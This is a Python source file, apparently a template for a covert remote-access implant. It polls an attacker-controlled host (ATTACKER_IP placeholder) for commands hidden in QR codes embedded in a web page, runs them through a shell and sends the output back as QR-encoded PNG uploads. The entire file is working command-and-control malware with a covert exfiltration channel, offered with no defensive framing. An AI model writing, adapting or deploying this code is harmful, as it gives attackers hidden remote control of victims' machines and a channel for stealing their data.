import requests
import subprocess
import time
from PIL import Image
from io import BytesIO
import qrcode
import pyzbar.pyzbar as pyzbar
import re
import base64

ATTACKER_IP = "{attacker_ip}"
PORT = {port}
POLL_INTERVAL = 3
CHUNK_SIZE = 1000  
last_command_hash = None

def encode_to_qr(data):
    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_L)
    qr.add_data(data)
    qr.make(fit=True)
    return qr.make_image(fill="black", back_color="white")

def decode_qr_from_base64(base64_data):
    """Decode QR code from base64 string"""
    try:
        # Remove data URL prefix if present
        if ',' in base64_data:
            base64_data = base64_data.split(',')[1]
        
        # Decode base64 to image bytes
        image_bytes = base64.b64decode(base64_data)
        img = Image.open(BytesIO(image_bytes))
        decoded = pyzbar.decode(img)
        if decoded:
            return decoded[0].data.decode("utf-8")
    except Exception as e:
        return None

def decode_qr(image_data):
    """Decode QR code from image bytes (for backward compatibility)"""
    try:
        img = Image.open(BytesIO(image_data))
        decoded = pyzbar.decode(img)
        if decoded:
            return decoded[0].data.decode("utf-8")
    except Exception:
        return None

def extract_qr_from_html(html_content):
    """Extract base64 QR code data from HTML"""
    try:
        # Look for base64 data URL in img src attribute
        pattern = r'src="data:image/png;base64,([^"]+)"'
        match = re.search(pattern, html_content)
        if match:
            return match.group(1)
        return None
    except Exception:
        return None

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout or result.stderr
    except Exception as e:
        return f"Error: {e}"

def send_output(output, result_index):
    chunks = [output[i:i + CHUNK_SIZE] for i in range(0, len(output), CHUNK_SIZE)]
    for idx, chunk in enumerate(chunks):
        qr_output = encode_to_qr(chunk)
        buffer = BytesIO()
        qr_output.save(buffer, format="PNG")
        result_url = f"http://{ATTACKER_IP}:{PORT}/result{result_index}_{idx}.png"
        requests.post(result_url, data=buffer.getvalue(), headers={"Content-Type": "image/png"})

def main():
    global last_command_hash
    result_index = 0

    while True:
        try:
            # Fetch web.html instead of PNG files
            url = f"http://{ATTACKER_IP}:{PORT}/web.html"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                html_content = response.text
                
                # Extract base64 QR code from HTML
                qr_base64 = extract_qr_from_html(html_content)
                
                if qr_base64:
                    # Check if this is a new command (by comparing hash)
                    current_hash = hash(qr_base64)
                    if current_hash != last_command_hash:
                        # Decode the QR code
                        command = decode_qr_from_base64(qr_base64)
                        
                        if command and command != "WAITING_FOR_COMMAND":
                            print(f"[+] Received command: {command}")
                            output = execute_command(command)
                            send_output(output, result_index)
                            result_index += 1
                            last_command_hash = current_hash
                        elif command == "WAITING_FOR_COMMAND":
                            # Just update hash to avoid re-processing, but don't execute
                            last_command_hash = current_hash
                        else:
                            print("[-] Failed to decode QR code from HTML")
                    # If same hash, command already processed, just wait
                else:
                    print("[-] No QR code found in HTML")
            
            time.sleep(POLL_INTERVAL)
        except Exception as e:
            time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    try:
        main()
    except:
        pass 
